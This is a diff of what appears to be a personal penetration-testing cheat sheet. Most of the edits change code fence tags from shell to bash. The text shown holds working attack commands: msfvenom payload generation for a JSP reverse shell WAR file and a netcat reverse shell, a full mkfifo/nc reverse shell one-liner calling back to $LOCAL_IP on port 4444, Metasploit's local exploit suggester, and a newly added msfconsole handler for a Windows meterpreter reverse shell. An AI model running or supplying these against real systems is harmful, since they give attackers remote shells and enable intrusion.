@@ -14,23 +14,23 @@ background
 
 See payload options:
 
-```shell
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp --list-options
 ```
 
 Create payload:
 
-```shell
+```bash
 msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LOCAL_IP LPORT=4444 -f war > runme.war
 ```
 
 Create bash reverse shell line:
 
-```shell
+```bash
 msfvenom -p cmd/unix/reverse_netcat RHOST=tun0 RPORT=4444 R
 ```
 
-```shell
+```bash
 mkfifo /tmp/ipvquh; nc $LOCAL_IP 4444 0</tmp/ipvquh | /bin/sh >/tmp/ipvquh 2>&1; rm /tmp/ipvquh
 ```
 
@@ -52,4 +52,8 @@ use post/multi/recon/local_exploit_suggester
 set session 1
 exploit
 #don't forget to set new handler to tun0 and new port
+```
+
+ ```bash
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST $LOCAL_IP;set LPORT 4444;run;" 
 ```
